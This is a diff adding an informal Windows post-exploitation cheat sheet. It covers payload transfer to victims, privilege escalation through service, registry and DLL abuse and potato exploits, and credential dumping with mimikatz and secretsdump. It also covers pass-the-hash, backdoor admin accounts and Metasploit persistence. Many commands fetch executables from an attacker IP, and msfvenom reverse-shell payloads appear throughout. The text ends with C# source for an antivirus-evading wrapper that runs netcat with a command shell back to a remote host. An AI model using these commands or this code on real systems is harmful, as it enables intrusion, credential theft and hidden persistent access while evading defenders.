@@ -1,1 +1,711 @@
+File Transfers
+smb transfer
 
+Run this following command on the directory including the file and this will start a smb share of that dir
+
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username user -password password
+
+NOw authenticate this share in target by
+
+    net use \IP\share /USER:user password
+
+    Now on victim machine
+
+    copy \IP\sharename\filename localpathwheretosave
+
+to transfer the file from windows to linux
+
+copy filename.exe \IP\sharename
+
+Note if we get an error 1312 or any error regarding smbserver login we may need to change our command a bit
+
+Then we will specify domain in /USER:domain\user
+
+###Disconnect the share from target
+
+    net use \IP\share /del
+
+Invoke web request transfer
+
+Start a web server on our local machine and past the following command in victim shell
+
+    powershell.exe iwr -uri 10.4.30.255/file.exe
+
+CertUtil
+
+Start a local web server and use followinv command on victim
+
+    certutil -urlcache -f http://10.4.30.255/file.exe file.exe
+
+BitsAdmin
+
+start a web server and use this command on victim
+
+    bitsadmin /transfer job https://10.4.30.255/file.exe C:\Temp\file.exe
+
+Net.webclient
+
+    powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.4.30.255/file.exe', 'file.exe')
+
+RDP,remote connection etc
+Winexe
+
+we can connect to a windows shell using winexe
+
+    winexe -U 'admin%password' //10.10.5.159 cmd.exe
+
+If we want a system shell just provide a --system flag in above command
+evil-winrm
+
+We can connect to windwows shell if we have gained credentials
+
+evil-winrm -u Administrator -p password -i IP -P PORT OR
+
+for pass the hash attack
+evil-winrm -u Administrator -H HASH -i IP -P PORT
+
+WE can upload and download files using download and upload keywords
+
+    upload LOCAL_FILEPATH REMOTE_FILEPATH
+
+    download REMOTE_FILEPATH LOCAL_FILEPATH
+
+INclude directory share in session(Powershell scripts only)
+
+Uploading tools is all well and good, but if the tool happens to be a PowerShell script then there is another (even more convenient) method. If you check the help menu for evil-winrm, you will see an interesting -s option. This allows us to specify a local directory containing PowerShell scripts -- these scripts will be made accessible for us to import directly into memory using our evil-winrm session (meaning they don't need to touch the disk at all). For example, if we happened to have our scripts located at /opt/scripts, we could include them in the connection with: evil-winrm -u USERNAME -p PASSWORD -i IP -s /opt/scripts
+
+    Some important scripts like port scan or privelege escalation written in ps1 can be attached with our winrm session without touching the disk, We can download many ps1 scripts used for postexploitation from empire github repo
+
+    https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/situational_awareness/network/
+
+RDP
+xfreerdp
+
+This tool allows us rdp and have useful switches .For example we can specify a directory from our local machine which will act as a share in target machine.This way we can easily use tools of our choice without ever touching the target disk.
+
+xfreerdp /v:TARGETIP:PORT /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,sharename
+
+In above drive we can specify any directory but kali has a dfault directoy with collection of all windows related tools so we will use that
+Accessing shared directory and its tool on windows target
+
+If we mounted an share using xrdp and now have to use tools in that share , we can do that by using following syntax command
+
+    \tsclient\sharename\binarypath
+
+Privilege escalation
+First run the windows exploit suggestor which can find potential exploits
+
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+install xlrd-1.2.0 which is older version for this to work
+
+    python windows-exploit-suggester.py --database 2021-11-30-mssb.xls --systeminfo sysinfo.txt --ostext ' Microsoft Windows Server 2016 Standard'
+
+Powershell Port scanner
+
+$target=Read-Host -Prompt'Enter Ip address to scan' $portstart=Read-Host -Prompt'Enter Port from which to start scanning' $portend=Read-host -Prompt'Enter Port where to end the scanning'
+
+for ($latest=130;$latest -le 140;$latest ++) { $socket = Test-NetConnection $target -Port $latest
+
+if ($socket) { echo "port no $latest is open"} else{ echo "port no $latest is close" }
+
+}
+Finding file names having specific string in powershell
+
+ls -r -file -path pathfromwheretostart -filter string to find -ErrorAction SilentlyContinue
+Finding specific strings inside files of given directory(find hard coded credentials etc) in powershell
+
+ls -r c:\ -file | % {select-string -path $_ -AllMatches -pattern stringtofind}
+PowerUp.ps1 escalation
+
+    First transfer the PowerUp.ps1 to target box
+
+    RUn powershell and then Import powerup in it
+
+    Import-Module .\PowerUp.ps1
+
+    Now run to the the escalation checker
+
+    Invoke-AllChecks
+
+    NOw simply run the Abusefunction scripts regarding a vector and a user with username john and password Password123! will be added with admin priveleges. we can also add custom user by -UserName flag and password with -Password alongside the abusefunction script
+
+We can also do other things instead of making a new user
+
+https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
+Manual Escalation
+View avaialble groups
+
+    net localgroup
+
+View if user is in a group or not
+
+    net localgroup groupname
+
+for eg net localgroup administrators
+Current user privileges
+
+    whoami /priv
+
+this lists all the privileges of our current user. Note that all the listed privileges are vailable to us regardless of enabled or disabled status becuase we may not have that privilege in our current process and we may need to migrate to different process
+
+printspoofer.exe,juicypotato,rottenpotato,roguepotato,sweetpotatoetc
+
+Some Common privileges
+
+    SeImpersonatePrivilege and SeAssignPrimaryPrivilege
+
+THis allows our user to impersonate as any tokens it can find and we can grap admin tokens from system process and impersonate using that
+
+    Use juicy potato exploit
+
+    Token Impersonation by using incognito or mimikatz
+
+    SeBackupPrivilege
+
+This allows us read access to all the system objects meaning we can read sensitive information like hashes from registry etc
+
+    SeRestorePrivilege
+
+This allows us write access to system objects meaning we can modify service binaries or hijack dlls etc
+
+    SeTakeOwnershipPrivilege(WRITE_OWNER permission)
+
+This allows us to completely own the object and we can read and write to it and abuse it like modify service binarfies or edit registries etc
+
+NOte: in real attacks we would need to get obfuscated binary of winpeas.exe or we can get its batch version (from same repository) which will not be picked by defender or amsi.
+Service exploits
+
+we can see all users installed services by following command
+
+    wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+
+we can see any unqouted paths vector from here manually.etc
+
+.\winpeas.exe quiet servicesinfo
+
+  we have to replace the service names with names found on target from winpeas
+
+Insecure Service Permissions
+
+this exploit is like path manipulation.WE see that if we have permissions to change settings of a certain service and we can stop or start the service then we can poiny it to our malicious executable file and when we restart the service our executable run as SYSTEM
+
+we can use following command to see permissions of services using winpeas
+
+    .\winpeas.exe servicesinfo
+
+we get the services which we can possibly modify
+
+Now we use accesschk.exe to see the which permissions we can abuse of that service
+
+    .\accesschk.exe /accepteula -uwcqv username servicename
+
+!!This vector only work if we have stop or start service permission available else its a rabithole. !! The service must also have SERVICE_CHANGE_CONFIG which allows us to modify permissions
+
+Now we can interact with service
+
+    sc qc servicename
+
+!!The service must also have SERVICE_START_NAME set to system so we know it runs as SYSTEM.
+
+Now we will change the BInarypath to our executable
+
+    sc config servicename binpath= ""C:\PrivEsc\reverse.exe""
+
+We can see the status of service by
+
+    sc query servicename
+
+If it is running then we have to stop the service and again start the service
+
+If it is stopped then just start the service and our file will be executed
+
+    net start servicename
+
+Unquoted service path
+
+we can abuse this service due to insecure path validity in windows. service name is unquotedsvc suppose we have a path
+
+c:\program files\common files\file.exe
+
+NOte: Windows thinks that directories are executables so it will look for execetuables with each directory name like program.exe then common.exe etc
+
+when we run file.exe using absolute path,windows call unquotedsvc to check each possible directory to see if it is executable or not .That means first windows will check\program to see if its an exectuable,if not then it will check \common as executable and then like this we run our proper executable. So we cann add our executable before the original file and execute that
+
+windows will first see in c:\ for program.exe because of directory name program files
+
+then
+
+Program files directry looks for common.exe beause of the directory common files being unquoted
+
+Fist query the unquotedsvc to see if we have proper start,stop and system permission for the service
+
+    sc qc servicename
+
+After confirming this we have to see which path is writable so we can write
+
+find the permissions of path by icacls built in utility.We can start from program files and gradually start from there and keep adding directories
+
+    icacls "c:\program files \ vuln path\path exploit\file.exe"
+
+we can find that by using.We gradually see all the partial directories to see if its writable .NOte this c:\programfiles\unquotedpathserviece is just an example
+
+    \accesschk.exe /accepteula -uwdq "C:"
+
+    \accesschk.exe /accepteula -uwdq "C:\Program Files"
+
+    \accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
+
+                     OR
+
+We can check different upper path directories for write permissions. Whichever upper directory is writable,we can transfer our malicious file there
+
+    powershell "get-acl -Path 'PATH before the service executable' | format-list"
+
+Now just move our malicuous file to a writable path so its executed before the original
+
+    copy exploit.exe "C:\Program Files\Unquoted Service Files\exploit.exe"
+
+Now just stop and again start the unquotedsvc
+
+    net stop unquotedsvc
+
+    net start unquotedsvc
+
+Weak registry permissions
+
+    First identify the path which is vulnerbale to this attack
+
+-then query it to see its inf0
+
+    sc qc regsvc
+
+SERVICE_START_NAME must be set to system so we know that root is runng the service
+
+    Now we use accesschk to see which permissions we have
+
+    .\accesschk /accepteula -uvwqk registrypath or regisrtry (conditianal)
+
+now we point our executable to the registry config so it gets executed
+
+    reg add weakregistrypath /v ImagePath /t REG_EXPAND_SZ /d pathtoourfile /f
+
+Writable insecure services
+
+In this we usually exploit if any service being ran by system is writable by us
+
+We will simply overwrite the service with our code and then simpply restart it
+
+First we check if we Authority permission on the service
+
+    sc qz filepermsvc
+
+Now we use accesschk to see if we have writa permission to service binary
+
+    .\accesschk.exe /accepteula -quvw "Path to service"
+
+If its writable then we overwrite it woth our malicius file
+
+    copy maliciousfilepath "service path" /Y
+
+Now we restart the service
+
+    net start filepermsvc
+
+DLL hijacking
+
+This attack works when the dll service look for a dll file in different paths in windows and if any path is writable by us then we can simply create dll msfvenom payload and write to that path and when we start the dllservice that malicius payload is loaded and run to find the dll filename we have to need access to rfd and use process monitor
+
+In winpeas output see if any dll path is writable
+
+then query the dllservice to see if that is being run by System
+
+    sc qc dllsvc
+
+Now check our permission using accesschk
+
+    .\accesschk /accepteula -uvqc username dllservicenmae
+
+Now if we can start or stop the service then we will proceed
+
+Now create a msfvenom payload for dll hijack in our linux and transfer it
+
+    mfsvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.30.255 LPORT=6969 -f dll -o hijack.dll
+
+Now start the service
+
+    net start dllsvc
+
+Registery Privesc
+
+.\winpeas.exe quiet applicationsinfo
+AutoRuns
+
+In winpeas output we will see many different registry files which autorun on startup
+
+And it will tell us if any of that service is wriytable by us OR
+
+we can manually check the writable query by
+
+    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+Now we will have few files and we will manually check them by using accesschk if we can write to it
+
+    .\accesschk.exe /accepteula -wvu "FilePath"
+
+Now copy the orignal registry file for backup and transfer our malicous file to that location with that name so that poiosned file is loaded when registry is loaded
+
+    copy "Registryfilepath" c:\Temp
+
+Now overwrite the registry with our reverse shell
+
+    copy OURfilePath "RegistryPath" /Y
+
+In windows 10 , the user with which we restart the pc the registry is run by privelege of that user so we will need to login as admin on rdp and then restart so the reegistry gets executed as admin
+
+IN real life engagement we will have to wait for administrator to restart the pc
+Always Install Elevated
+
+.\winpeas.exe quiet windowscreds
+
+In this we usually run a msi package which is our reverse shell and this happens when the system allows the current user to run msi files as privilged user
+
+TO check manually:
+
+we need two options to be enable for this These both need to be set to 1 to work
+
+    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+WInpeas will highlight for us if these options are enabled
+
+Now all we need to do is just create a msfvenom payload and execute it
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.30.255 LPORT=6969 -f msi -o reverse.msi
+
+Now transfer the file and just execute it
+
+    msiexec /quiet /qn /i PATHTOMSIFILE
+
+Passwords
+
+After finding passwords , we can use winexe to login just like ssh
+Registry passwords
+
+.\winpeas.exe quiet filesinfo usersinfo
+
+we can find credentials in configuration files,registry keys etc
+
+The following command will display all the contents having password keyword in registry
+
+    reg query HKLM /f password /t REG_SZ /s
+
+Autologon registry is an important registry and we can target this specific registory so we get less output
+
+    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+Now we can connect to windows shelljust like ssh using the credrntials using a service known as winexe
+
+    winexe -U 'admin%password' //10.10.5.159 cmd.exe
+
+Saved Credentials
+
+.\winpeas.exe quiet cmd windowscred
+
+Windows save credentials of some user so other user can run some commands on behlaf of that user similiar to sudo we can use these saved credentials to run commands as admin user . Run the command to see which users credntials are saved
+
+    cmdkey /list
+
+Now we will use runas command to execute any command as the admin
+
+    runas /savecred /user:SavedUsername ANYCOMMAND
+
+We can run our reverse shell as admin and get root shell
+Searching config files for passwords
+
+Below winpeas flag may find possible locations for credentials leakage
+
+    .\winpeas.exe quiet cmd searchfast filesinfo
+
+This command will find for files having pass in its name or ending with .config extension
+
+    dir /s pass == *.config
+
+This command search files contents for word password and specified file extension Instead of running this in system root directory , run this command in users home dir or weird directories where you think passswords are possible
+
+    findstr /si password *.xml *.ini *.txt
+
+SAM passwords
+
+MImikatz can be also used but that will be flagged by windows defender We can also disable windows defender as we would be admin if we stand at hashdump point but disabling of defenses may alert SOC analyts etc\
+
+THis command will save a backup of SAM file
+
+    reg.exe save HKLM\SAM sam.bak
+
+We also need system key which can be fetched by
+
+    reg.exe save HKLM\SYSTEM system.bak
+
+Now transfer these files back to local machine and use impacket or any tool to dump hashes
+
+Possible SAM locations
+
+    .\winpeas.exe quiet cmd searchfast filesinfo
+
+SAM is a local database in windows which store user passwords hashes. It requires a key which is stored in a file named SYSTEM .If we have both we can extract the hashes on our machine and crack using john the ripper
+
+SAM files are located in c:\windows\system32\config
+
+Backups maybe in c:\windows\system32\config\REgback , c:\windows\repair
+
+We copy the sam and system files on our machine and then use impacket's secretdump.py to dump the hashes
+
+we need a python module
+
+pip3 install pycrypto
+
+Now just use the secretdump.py as
+
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam samfile -system systemfile LOCAL
+
+REMOTELY:
+
+If we have valid credentials for a domain controller then we can dump all the hashes directly from our machine
+
+    secretsdump.py -just-dc-ntlm domain.name/username@IPADDRESS
+
+    secretsdump.py domain/username:password@IPADDRESS or secretsdump.py domain/username@IPADDRESS -H hash
+
+Passing the hash
+
+ntlm hash format is
+
+    username:salt:LM:NTLM:::
+
+when cracking hashes we only use the ntlm part
+
+Whenever we find hashes, we can use them directly sometiems instead of decrypting them
+
+we can use the hash in winexe command replacing the passowrd position.
+
+we specify the LM and NTLM part of the hash
+
+we use a modified version of winexe called pth-winexe
+
+    pth-winexe -U'admin%LM:NTLM' //10.4.30.255 cmd.exe
+
+If we want a system shell we simply provide a --system flag
+Autorun and scheduled tasks
+
+In windows we can only see scheduled tasks of users with smae or lower priveleges
+
+we can see the autorun scheduled tasks by the command
+
+    schtasks /query /fo LIST /v
+
+or in Powershell
+
+    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Taskname,TaskPath,State
+
+    Most of the time we find scheduled tasks and programs through manual enumuration because they are custom programs
+
+Once we find a scheduled tasks we can see its permission by accesschk
+
+    .\accesschk.exe /accepteula -quvw username schedulefilepath
+
+If we can write or append data to the file then we can add our own code
+
+First make a backup of sheduled file in temp directroy
+
+    copy shceduledfilepath c:\windows\temp
+
+below we append contents of our reverse shell inside the file (We have to specify absolute path)
+
+    echo reverseshellfilepath >> scheduledfilepath
+
+Insecure GUI APPs (IF RDP ENABLED)
+
+try gui apps running as admin and then type following to confirm
+
+    tasklist /V | findstr prrogram.exe
+
+If its running as admin then we can usually find way to execute cmd.exe from file or open file function file://c:/windows/system32/cmd.exe
+Startup Apps
+
+Some Apps are placed in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp directroy which windows loads when it starts
+
+    Remember that shortcuts of file are placed in startup direcory instead of the file itself
+
+    Check permissions using accesschk.exe
+
+    accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+so if we have Write access then we can create a malicious files and place its shortcut here
+
+    Create a vbs script as follows (reverse.exe is our malicious file and we name the slinkfile as reverse.lnk)
+
+Set oWS = WScript.CreateObject("WScript.Shell") sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk" Set oLink = oWS.CreateShortcut(sLinkFile) oLink.TargetPath = "C:\PrivEsc\reverse.exe" oLink.Save
+
+CreateShortcut is name of our vbs file
+
+    Now type cscript CreateShortcut.vbs
+
+    The shortcut has been created and now we only need the administrator user to login to the machine so our apyload gets executed
+
+Installed apps
+
+.\winpeas.exe quiet procesinfo (or processinfo)
+
+we can search for these apps on exploitdb and have priv esc using these installed applications
+
+we can also use seatbelt.exe tool to find such apps
+
+    .\seatbelt.exe NonstandardProcesses
+
+Hot Potato
+
+This vulneribility is fixed in latest windows 10 version
+
+    .\potato.exe -ip(linuxip) -cmd "malicious file to execute as authority" -enable_http server true -enable_defender true -enable_spoof true -enable_exhaust true
+
+run a listener and get a reverse shell
+
+https://foxglovesecurity.com/2016/01/16/hot-potato/
+SeImpersonatePrivilege (juicy potato,printspoofer,roguepotato,sweetpotato)
+
+service accounts are accounts which are used for specific purposes and granted administrator access sometimes
+
+If we have access to local services account on windows then we can get authority shell
+
+    First Check if the service account has seimpersonate token enabled
+
+    Now run the exploit
+
+    .\JuicyPotato.exe -l 1337 -p malicious file -t * -c {clsi number for windows version}
+
+           or
+
+    PrintSpoofer.exe -i -c cmd
+
+3.we will get the shell as authority
+PrintSpoofer
+
+If this is a b=vulneribility then we can simply exploit using printspoofer binary
+
+we need a service account running so we need to simulate this to get a service account shell through rdp if service shell is not running by default
+
+we need to loginas admin and run cmd as adminsitrator and then type following command to get a service shell up and running
+
+After this we can follow the real attack steps
+
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+
+    we need a service account cmd to do this attack. If we have a local service or any service account running type the following command below in service account shell
+
+    C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+
+       OR
+
+    PrintSpoofer.exe -i -c cmd
+
+Persistence
+
+Suppose Now we are system level user. We need to make our stand more strong Following commands will create a new user and make them part of admin and rdp group.Now we can freely rdp as admin privilege
+
+net user USERNAME PASSWORD /add net localgroup Administrators USERNAME /add net localgroup "Remote Management Users" USERNAME /add
+HashDumps
+Mimikatz
+
+Note : If we are administrator or similiar privileges but we are getting error on running mimikatz , list down the process and migrate to a process running as administrator . Same goes for if we are system but our process might be in administrator context
+
+    First open the mimikatz binary
+
+    Now type in following to get us system privileges on mimikatz shell
+
+privilege::debug token::elevate
+
+If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.
+
+    We can now dump the hashes using the follwoing command
+
+    lsadump::sam (FOR NORMAL windows)
+
+OR
+
+    sekurlsa::logonpasswords (Dump hashes from current active sessions)
+
+OR
+
+    lsadump::lsa /patch (for Windows AD server)
+
+crackmapexec
+
+    crackmapexec IPADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
+
+OPening a port on windows
+
+    netsh advfirewall firewall add rule name="NAME" dir=in action=allow protocol=tcp localport=PORT
+
+Port Forwarding
+
+if we have a service running internally in an exlploited machine then we need to port forward it our machine so we can exploit it
+
+A tool called plink.exe is used for this purpose
+
+    We need to set permitrootlogin to yes in our /etc/ssh/sshd_config file
+
+    NOw run the ssh service using service ssh start
+
+    Now run the execeutbale and then you can access that port on your localhost
+
+    .\plink.exe root@yourip -R internalport:127.0.0.1:porttoforwardto
+
+Backdoor
+USing metasploit
+
+    First create a msfvenom payload either a exe or dll
+    Now get a shell back using that payload through multi/handler
+    After getting the session back,now background the msf shell by typing background
+    Then use exploit/windows/local/persistence and set the session number to your backgrounded shell session
+    What this will do is it will create a file on target which will autoamtically keep sending the connection back to our machine. Even after restart of target. The time by default is 10 seconds but we can change it . Now all we have to do is to start up a msf listener and we will receive a connection back after specied interval
+
+NOTE: Remember to set the payload in multi handler same as which was used in creating the malicious exe or dll
+Wrapper reverse shell exeutable code (BYpass AV and windows defender)
+
+THis csharp code can be commpiled into exeutable using mono-devel compiler THis will make a execuatble which is a wrapper and will not be suspicious to AV and defenses. BUt internally it executes our malicuous code
+
+.......................
+
+//IMporting basic modules which will help us start system processes using System;
+using System.Diagnostics;
+
+namespace Wrapper{ class Program{ static void Main()
+
+   {
+     
+     //Creating an Process class object which is imported from System module
+      Process proc = new Process();
+      //Creating process info telling it instruction on what to do when started in system memory
+      ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-cyberjunkie.exe", "10.50.49.32 10000 -e cmd.exe");
+     
+     
+     //restrictig service to create a gui which may make users suspicious thats why disabling it
+      procInfo.CreateNoWindow = true;
+      //starting the proces
+      proc.StartInfo = procInfo;
+      proc.Start();
+
+                           
+    }
+}
+
+}
+
+.......................
+
+compile this with
+
+    mcs filename.cs
+
+now transfer the exeutable to target windows and make it execute somehow :)))
